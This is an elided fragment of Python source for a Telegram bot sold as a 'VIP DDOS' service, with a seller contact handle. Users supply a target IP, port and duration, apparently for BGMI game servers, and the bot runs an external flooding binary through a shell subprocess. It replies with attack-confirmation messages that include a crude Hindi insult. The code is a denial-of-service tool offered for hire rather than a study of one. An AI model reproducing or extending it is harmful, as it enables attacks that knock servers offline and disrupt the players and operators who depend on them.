...
def handle_start(message):
    if message.chat.type == 'group':
        ...
        welcome_message = f"""
*Welcome to SAM VIP DDOS 🚀  
ANY INQUIRYS AND BUY_ @Samy784
...
def process_bgmi_command(message):
    try:
        ...
        bot.send_message(message.chat.id, "Attack lag gya hai Screen shot lo busdike or send kar. @Samy784")
...
async def run_bgmi_command_async(target_ip, target_port, duration):
    try:
        process = await asyncio.create_subprocess_shell(
            f"./raja {target_ip} {target_port} {duration} {10} {1000}",
